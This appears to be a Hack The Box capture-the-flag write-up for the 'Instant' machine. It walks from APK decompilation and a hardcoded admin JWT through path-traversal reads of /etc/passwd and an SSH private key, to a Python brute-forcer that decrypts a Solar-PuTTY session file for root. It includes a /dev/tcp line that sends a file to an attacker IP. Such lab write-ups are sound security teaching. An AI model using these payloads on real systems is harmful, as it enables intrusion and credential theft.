---
layout: post
title: "Instant HTB writeup"
subtitle: "Walkethrough for the Instant HTB machine."
date: 2024-10-13 23:45:13
background: '/img/posts/04.jpg'

---

## Report

Beginning with the default `nmap` scan

```bash
nmap $ip -sV -p-
```

Found some common ports 

<br/> 
<img src="/img/instant_screenshots/Pasted image 20241013193728.png" alt="1" style="width:700px; height:auto;">
<br/> 

- 22: `SSH`
- 80: `HTTP`
- Host: `instant.htb`

Interacting with the `HTTP` port using a web browser.

<br/> 
<img src="/img/instant_screenshots/Pasted image 20241013193838.png" alt="1" style="width:700px; height:auto;">
<br/>

We are redirected to an unknown domain `instant.htb`.

Adding it to the `/etc/hosts` files.

<br/> 
<img src="/img/instant_screenshots/Pasted image 20241013193946.png" alt="1" style="width:700px; height:auto;">
<br/>

We are welcomed with the index page.

<br/> 
<img src="/img/instant_screenshots/Pasted image 20241013194113.png" alt="1" style="width:700px; height:auto;">
<br/>

We can see a `download` button.  

Clicking on it , we download an android application `instant.apk`.

<br/> 
<img src="/img/instant_screenshots/Pasted image 20241013194233.png" alt="1" style="width:700px; height:auto;">
<br/>

Decompiling the application using `apktool`. 

```bash
apktool d instant.apk
```

The application was decompiled successfully. 

<br/> 
<img src="/img/instant_screenshots/Pasted image 20241013194452.png" alt="1" style="width:700px; height:auto;">
<br/>

We have a lot of `files` and `directories`. 

<br/> 
<img src="/img/instant_screenshots/Pasted image 20241013194512.png" alt="1" style="width:700px; height:auto;">
<br/>

After some search, finding in `instant/res/xml/` a file called  `network_security_config.xml` as this is an important location for android applications to save the configuration files and rules that will govern the application.

```xml
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <domain-config cleartextTrafficPermitted="true">
        <domain includeSubdomains="true">mywalletv1.instant.htb</domain>
        <domain includeSubdomains="true">swagger-ui.instant.htb</domain>
    </domain-config>
</network-security-config>
```

We can find some subdomains `mywalletv1.instant.htb` and `swagger-ui.instant.htb` where we can add them to `/etc/hosts`. 

<br/> 
<img src="/img/instant_screenshots/Pasted image 20241013194806.png" alt="1" style="width:700px; height:auto;">
<br/>

Checking them on browser 
- `mywalletv1` got error 

<br/> 
<img src="/img/instant_screenshots/Pasted image 20241013194909.png" alt="1" style="width:700px; height:auto;">
<br/>

We still did not identify any valid paths till now

- `swagger-ui` 

<br/> 
<img src="/img/instant_screenshots/Pasted image 20241013195011.png" alt="1" style="width:700px; height:auto;">
<br/>

We are welcomed with the documentation of the `api` used and its `routes`.  
We will go back to the `api` later as it needs authentication.  

Continuing with the application, decided to decompile it using `jadx-gui`.  

<br/> 
<img src="/img/instant_screenshots/Pasted image 20241013200056.png" alt="1" style="width:700px; height:auto;">
<br/>

Looking for the `main activities` on the application. 

<br/> 
<img src="/img/instant_screenshots/Pasted image 20241013200210.png" alt="1" style="width:700px; height:auto;">
<br/>

We can identify the full name of the application `instantlabs.instant`.  
Going with the low hanging fruits by checking the `AdminActivites` activity.   

```java
package com.instantlabs.instant;
  
  
import com.google.gson.JsonParser;
  
import com.google.gson.JsonSyntaxException;
  
import java.io.IOException;
  
import okhttp3.Call;
  
import okhttp3.Callback;
  
import okhttp3.OkHttpClient;
  
import okhttp3.Request;
  
import okhttp3.Response;
  
  
/* loaded from: classes.dex */
  
public class AdminActivities {
  
    private String TestAdminAuthorization() {
  
        new OkHttpClient().newCall(new Request.Builder().url("http://mywalletv1.instant.htb/api/v1/view/profile").addHeader("Authorization", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA").build()).enqueue(new Callback() { // from class: com.instantlabs.instant.AdminActivities.1
  
            static final /* synthetic */ boolean $assertionsDisabled = false;
  
  
            @Override // okhttp3.Callback
  
            public void onFailure(Call call, IOException iOException) {
  
                System.out.println("Error Here : " + iOException.getMessage());
  
            }
  
  
            @Override // okhttp3.Callback
  
            public void onResponse(Call call, Response response) throws IOException {
  
                if (response.isSuccessful()) {
  
                    try {
  
                        System.out.println(JsonParser.parseString(response.body().string()).getAsJsonObject().get("username").getAsString());
  
                    } catch (JsonSyntaxException e) {
  
                        System.out.println("Error Here : " + e.getMessage());
  
                    }
  
                }
  
            }
  
        });
  
        return "Done";
  
    }
  
}
```


We can find a `JWT` token of the admin.
To understand the code, look at this snippet 

```java
Request.Builder().url("http://mywalletv1.instant.htb/api/v1/view/profile").addHeader("Authorization", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA").build()).enqueue(new Callback()
```
The application makes a `URL` request to the `mywalletv1.instant.htb/api/v1/view/profile` endpoint and adding the header `Authorization` with the `JWT` token.   

To replicate that we will use the `CURL` command 

```bash
curl http://mywalletv1.instant.htb/api/v1/view/profile -H "Authorization:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"
```

We get a valid response.

<br/> 
<img src="/img/instant_screenshots/Pasted image 20241013200924.png" alt="1" style="width:700px; height:auto;">
<br/>

Now using the `swagger-ui` api 

<blockquote>
  <p><strong>swagger-ui:</strong> Use Swagger UI to generate interactive API documentation that lets your users try out the API calls directly in the browser. Use the spec to connect API-related tools to your API. For example, import the spec to SoapUI to create automated tests for your API.</p>
</blockquote>

We will use the endpoints identified from `swagger`.   

We can identify multiple ones and if we used any we will get `401` error because of the permissions.  

<br/> 
<img src="/img/instant_screenshots/Pasted image 20241013201143.png" alt="1" style="width:700px; height:auto;">
<br/>

Still going with the low hanging fruits and checking the `/api/v1/admin/view/logs`.

<br/> 
<img src="/img/instant_screenshots/Pasted image 20241013201408.png" alt="1" style="width:700px; height:auto;">
<br/>

We get permissions error.

<br/> 
<img src="/img/instant_screenshots/Pasted image 20241013201440.png" alt="1" style="width:700px; height:auto;">
<br/>

We do not have enough permissions.   

Taking the command used and adding the `JWT` token.  

```bash
curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/view/logs" -H  "Authorization:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"
```

We get a valid response.

<br/> 
<img src="/img/instant_screenshots/Pasted image 20241013201610.png" alt="1" style="width:700px; height:auto;">
<br/>

We can identify the user `shirohige`.  

Trying the next API `api/v1/admin/read/log` but directly with our header. 

```bash
curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=1.log" -H  "Authorization:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"
```

We can read the log file.  

<br/> 
<img src="/img/instant_screenshots/Pasted image 20241013201800.png" alt="1" style="width:700px; height:auto;">
<br/>

Testing for `LFI`. 

```bash
curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=../../../../../../../../../etc/passwd" -H  "Authorization:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"
```

We get a hit.

<br/> 
<img src="/img/instant_screenshots/Pasted image 20241013201850.png" alt="1" style="width:700px; height:auto;">
<br/>

Leaking the `private SSH key` of the user.

```bash
curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=../../../../../../../../../home/shirohige/.ssh/id_rsa" -H  "Authorization:eyJhbGciOiJIUzI1NiIsIn
R5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"
```

We get the key but in a bad format.  

<br/> 
<img src="/img/instant_screenshots/Pasted image 20241013201956.png" alt="1" style="width:700px; height:auto;">
<br/>

Using this `python` script to reformat it correctly.  

```python
def format_rsa_key(input_file, output_file):
    try:
      
        with open(input_file, 'r') as infile:
            content = infile.read()

        
        cleaned_content = content.replace('\\n', '\n').replace('","', '').replace('"', '')

      
        lines = cleaned_content.strip().splitlines()
        if lines[0] != "-----BEGIN RSA PRIVATE KEY-----":
            lines.insert(0, "-----BEGIN RSA PRIVATE KEY-----")
        if lines[-1] != "-----END RSA PRIVATE KEY-----":
            lines.append("-----END RSA PRIVATE KEY-----")

       
        with open(output_file, 'w') as outfile:
            outfile.write('\n'.join(lines) + '\n')

        print(f"RSA private key has been formatted and saved as {output_file}")
    except Exception as e:
        print(f"An error occurred: {e}")


if __name__ == "__main__":
    input_file = 'keyBad'
    output_file = 'id_rsa'
    format_rsa_key(input_file, output_file)
```

We have the corrected `id_rsa`.  

<br/> 
<img src="/img/instant_screenshots/Pasted image 20241013202847.png" alt="1" style="width:700px; height:auto;">
<br/>

`SSH` to the machine with the discovered user.  

```bash
chmod 600 id_rsa;ssh shirohige@instant.htb -i id_rsa
```

We are connected.  

<br/> 
<img src="/img/instant_screenshots/Pasted image 20241013203009.png" alt="1" style="width:700px; height:auto;">
<br/>

Looking for the low hanging fruits as always
Checking the `/opt`.  

<br/> 
<img src="/img/instant_screenshots/Pasted image 20241013203049.png" alt="1" style="width:700px; height:auto;">
<br/>

We can find a directory called  `Solar-PuTTY`.  

A quick search, found an `exploit` through this [link](https://github.com/VoidSec/SolarPuttyDecrypt)  as it was vulnerable to information disclosure.    

This is the script written in `C#`.  

```C#
﻿using System;
using System.Linq;
using System.Text;
using System.IO;
using System.Security.Cryptography;
using Newtonsoft.Json;

namespace SolarPuttyDecrypt
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length == 0 || args==null)
            {
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine("SolarPuttyDecrypt now will try to dump local sessions' file, otherwise enter SolarPutty's sessions file path and password.");
                Console.WriteLine("\nUsage: SolarPuttyDecrypt.exe C:\\session.dat pwd123 (use \"\" for empty password)");
                Console.ResetColor();
                //Environment.Exit(1);
            }
            string CurrDir = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            Console.WriteLine("-----------------------------------------------------");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("SolarPutty's Sessions Decrypter by VoidSec");
            Console.ResetColor();
            Console.WriteLine("-----------------------------------------------------");
            Console.ForegroundColor = ConsoleColor.Yellow;
            if(args.Length == 0 || args == null)
            {
                string ExportedDirectoryPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SolarWinds\\FreeTools\\Solar-PuTTY\\");
                string sessionfile = Path.Combine(ExportedDirectoryPath, "data.dat");
                DoImport(sessionfile, null, CurrDir);
            }
            else
            {
                DoImport(args[0], args[1], CurrDir);
            }
            Console.ResetColor();
            Console.WriteLine("-----------------------------------------------------");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("[+] DONE Decrypted file is saved in: " + CurrDir + "\\SolarPutty_sessions_decrypted.txt");
            Console.ResetColor();
        }
        static void DoImport(string dialogFileName, string password, string CurrDir)
        {
            using (FileStream fileStream = new FileStream(dialogFileName, FileMode.Open))
            {
                using (StreamReader streamReader = new StreamReader(fileStream))
                {
                    string text = streamReader.ReadToEnd();
                    try
                    {
                        var text2 = (password == null) ? Crypto.Deob(text) : Crypto.Decrypt(password, text);
                        if (text2 == null)
                        {
                            return;
                        }
                        var obj = JsonConvert.DeserializeObject(text2);
                        var f = JsonConvert.SerializeObject(obj, Formatting.Indented);
                        Console.WriteLine("\n"+f+"\n");
                        using (StreamWriter outputFile = new StreamWriter(Path.Combine(CurrDir, "SolarPutty_sessions_decrypted.txt")))
                        outputFile.WriteLine(f);
                    }
                    catch (CryptographicException ex)
                    {
                        if (ex.Message == "Padding is invalid and cannot be removed.")
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine("User entered wrong password for import");
                            Console.ResetColor();
                            Environment.Exit(1);
                        }
                        else
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine(ex);
                            Console.ResetColor();
                            Environment.Exit(1);
                        }
                        fileStream.Close();
                    }
                    catch (FormatException message)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine(message);
                        Console.ResetColor();
                        fileStream.Close();
                        Environment.Exit(1);
                    }
                }
            }            
        }
    }
}

internal class Crypto
{
    public static string Decrypt(string passPhrase, string cipherText)
    {
        byte[] array = Convert.FromBase64String(cipherText);
        byte[] salt = array.Take(24).ToArray();
        byte[] rgbIV = array.Skip(24).Take(24).ToArray();
        byte[] array2 = array.Skip(48).Take(array.Length - 48).ToArray();
        using (Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passPhrase, salt, 1000))
        {
            byte[] bytes = rfc2898DeriveBytes.GetBytes(24);
            using (TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider())
            {
                tripleDESCryptoServiceProvider.Mode = CipherMode.CBC;
                tripleDESCryptoServiceProvider.Padding = PaddingMode.PKCS7;
                using (ICryptoTransform transform = tripleDESCryptoServiceProvider.CreateDecryptor(bytes, rgbIV))
                {
                    using (MemoryStream memoryStream = new MemoryStream(array2))
                    {
                        using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read))
                        {
                            byte[] array3 = new byte[array2.Length];
                            int count = cryptoStream.Read(array3, 0, array3.Length);
                            memoryStream.Close();
                            cryptoStream.Close();
                            return Encoding.UTF8.GetString(array3, 0, count);
                        }
                    }
                }
            }
        }
    }

    public static string Deob(string cipher)
    {
        byte[] encryptedData = Convert.FromBase64String(cipher);
        try
        {
            byte[] bytes = ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser);
            return Encoding.Unicode.GetString(bytes);
        }
        catch (Exception message)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine(message);
            Console.ResetColor();
            Environment.Exit(1);
        }
        return string.Empty;
    }
}
```

We can Build the application using` visual studio code` but decided to convert the script to `python` to make it easier to run.   
The converted `python` script.  

```python
import base64
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

def decrypt(passphrase, ciphertext):
    try:
        # Decode the base64 encoded ciphertext
        array = base64.b64decode(ciphertext)
        salt = array[:24]
        iv = array[24:32]
        encrypted_data = array[48:]

        # Derive the key from the passphrase using PBKDF2
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA1(),
            length=24,  # Triple DES key size
            salt=salt,
            iterations=1000,
            backend=default_backend()
        )
        key = kdf.derive(passphrase.encode())

        # Create the cipher and decrypt the data
        cipher = Cipher(algorithms.TripleDES(key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        
        decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()

        data = ''.join(chr(c) for c in decrypted_data if chr(c).isascii())
        return data

    except Exception as e:
        print(f'Error: {e}')


with open('./sessions-backup.dat') as f:
    cipher = f.read()

with open('/usr/share/wordlists/rockyou.txt') as passwords:
    for i, password in enumerate(passwords):
        password = password.strip()
        decrypted = decrypt(password, cipher)
        print(f'[{i}] {password=}', end='\r')
        if 'Credentials' in decrypted:
            print('\r', i, password)
            print()
            print(decrypted)
            break
```

Copying the `sessions-backup.dat` file to our machine using this simple trick.  

```bash
cat sessions-backup.dat >& /dev/tcp/10.10.16.57/5555 0>&1
```

Using the script to decrypt the session and extract the information.  

```bash
python3 solar.py
```

We get the `root` password. 

<br/> 
<img src="/img/instant_screenshots/Pasted image 20241013203908.png" alt="1" style="width:700px; height:auto;">
<br/>

Logging in as `root`. 

<br/> 
<img src="/img/instant_screenshots/Pasted image 20241013203009.png" alt="1" style="width:700px; height:auto;">
<br/>

The machine was `pawned` successfully.  

<br/> 
<img src="/img/instant_screenshots/Pasted image 20241013003214.png" alt="1" style="width:700px; height:auto;">
<br/>
